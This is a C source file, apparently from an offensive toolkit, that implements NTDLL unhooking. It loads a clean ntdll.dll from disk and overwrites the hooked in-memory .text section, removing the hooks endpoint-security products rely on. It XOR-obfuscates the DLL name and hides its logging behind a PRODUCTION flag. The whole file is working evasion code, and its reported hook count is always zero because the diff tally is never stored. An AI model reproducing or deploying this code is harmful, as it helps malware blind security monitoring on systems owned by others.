/*
 * Author: 28zaakypro@proton.me
 * NTDLL unhooking — overwrites the hooked .text section with a clean copy from disk
 */

#include "unhooking.h"
#include "obfuscation.h"

PVOID LoadFreshNTDLL() {
    // Build path: GetSystemDirectory + \ntdll.dll (XOR 0x42)
    BYTE obfNtdllFilename[] = {0x1E, 0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdllFilename[16];
    DeobfuscateString(obfNtdllFilename, 10, 0x42, ntdllFilename);

    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, ntdllFilename);

    #ifndef PRODUCTION
    printf("[*] Loading fresh ntdll from: %s\n", ntdllPath);
    #endif

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        #ifndef PRODUCTION
        printf("[-] Failed to open ntdll: %d\n", GetLastError());
        #endif
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID freshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!freshNtdll) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, freshNtdll, fileSize, &bytesRead, NULL)) {
        #ifndef PRODUCTION
        printf("[-] ReadFile failed: %d\n", GetLastError());
        #endif
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    #ifndef PRODUCTION
    printf("[+] Fresh ntdll at 0x%p (%d bytes)\n", freshNtdll, fileSize);
    #endif
    return freshNtdll;
}

// Locate .text section using VirtualAddress (for in-memory PE)
BOOL FindTextSection(PVOID moduleBase, PVOID* textStart, SIZE_T* textSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textStart = (BYTE*)moduleBase + section[i].VirtualAddress;
            *textSize  = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Locate .text section using PointerToRawData (for file-loaded PE)
BOOL FindTextSectionRaw(PVOID moduleBase, PVOID* textStart, SIZE_T* textSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textStart = (BYTE*)moduleBase + section[i].PointerToRawData;
            *textSize  = section[i].SizeOfRawData;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL RestoreTextSection(PVOID hookedNtdll, PVOID freshNtdll) {
    PVOID hookedText, freshText;
    SIZE_T hookedSize, freshSize;

    if (!FindTextSection(hookedNtdll, &hookedText, &hookedSize))    return FALSE;
    if (!FindTextSectionRaw(freshNtdll, &freshText, &freshSize))    return FALSE;

    SIZE_T restoreSize = (freshSize < hookedSize) ? freshSize : hookedSize;

    // Count modified bytes (hooks)
    DWORD diff = 0;
    for (SIZE_T i = 0; i < restoreSize; i++)
        if (((BYTE*)hookedText)[i] != ((BYTE*)freshText)[i]) diff++;

    #ifndef PRODUCTION
    printf("[*] Hooked bytes: %d — restoring %zu bytes\n", diff, restoreSize);
    #endif

    DWORD oldProtect;
    if (!VirtualProtect(hookedText, restoreSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(hookedText, freshText, restoreSize);

    DWORD tmp;
    VirtualProtect(hookedText, restoreSize, oldProtect, &tmp);
    FlushInstructionCache(GetCurrentProcess(), hookedText, restoreSize);

    #ifndef PRODUCTION
    printf("[+] .text section restored\n");
    #endif
    return TRUE;
}

BOOL UnhookNTDLL(UNHOOK_RESULT* result) {
    result->success       = FALSE;
    result->hooksFound    = 0;
    result->hooksRemoved  = 0;
    result->bytesRestored = 0;

    #ifndef PRODUCTION
    printf("[*] NTDLL unhooking...\n");
    #endif

    BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdllName[16];
    DeobfuscateString(obfNtdllName, 9, 0x42, ntdllName);

    HMODULE hookedNtdll = GetModuleHandleA(ntdllName);
    if (!hookedNtdll) return FALSE;

    PVOID freshNtdll = LoadFreshNTDLL();
    if (!freshNtdll) return FALSE;

    if (!RestoreTextSection(hookedNtdll, freshNtdll)) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return FALSE;
    }

    VirtualFree(freshNtdll, 0, MEM_RELEASE);

    result->success      = TRUE;
    result->hooksRemoved = result->hooksFound;
    return TRUE;
}

void PrintUnhookResult(UNHOOK_RESULT* result) {
    #ifndef PRODUCTION
    if (result->success)
        printf("[+] Unhooking OK — hooks removed: %d\n", result->hooksRemoved);
    else
        printf("[-] Unhooking failed\n");
    #endif
}
